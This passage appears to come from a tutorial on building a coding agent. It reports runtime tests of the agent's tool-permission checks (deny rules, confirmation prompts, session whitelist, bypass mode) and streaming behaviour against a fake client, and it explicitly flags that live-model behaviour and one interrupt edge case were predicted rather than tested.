- **Implement 6's reconciled, streaming-shaped `agent.ts`, exercised at runtime against a fake client** (mimicking `MessageStream`'s `.on()`/`.finalMessage()` shape, the same technique Phase 5 and this phase's Implement 5 already used) — three separate real, executed scripts confirmed: (1) a read-only tool (`read_file`) started early via `earlyExecutions`, during the stream and before `finalMessage()` resolved, was correctly denied by a Layer-1 `.claude/settings.json` deny rule targeting that exact call — proving `checkPermission()`'s verdict is identical regardless of whether `executeTool()` is invoked from the early-execution call site or the post-turn one; (2) the post-turn call site correctly gated a write tool (`run_shell`) through all of `confirm`-then-approve (with the session whitelist suppressing a repeat prompt for an identical later call), `confirm`-then-deny, a Layer-1 deny rule (denied with the mock `confirmTool` never invoked), and `bypassPermissions` (allowed with no prompt); (3) `onText` fired once per text delta (four calls reconstructing a four-fragment string, not one call with the whole thing) and, in a turn containing both a read-only and a write tool side by side, only the read-only tool was early-started — the write tool ran solely from the post-turn loop. All three scripts' actual output is what the Implement 6 verification notes above quote from.
- **Unverified / flagged explicitly:** no live call to the Anthropic API was made while writing this tutorial (no API key was available in this authoring environment, consistent with every prior phase's own flagged limitation) — the Verify section's live-model tool-call sequences are predicted, not observed. The Concept 6 edge case (Ctrl+C pressed while a confirmation prompt is actively displayed) was reasoned through directly from Phase 5's and this phase's actual code, not exercised against a live, timed interactive terminal session — this is explicitly called out in both Concept 6 and the Verify section's closing paragraph, rather than presented as tested.
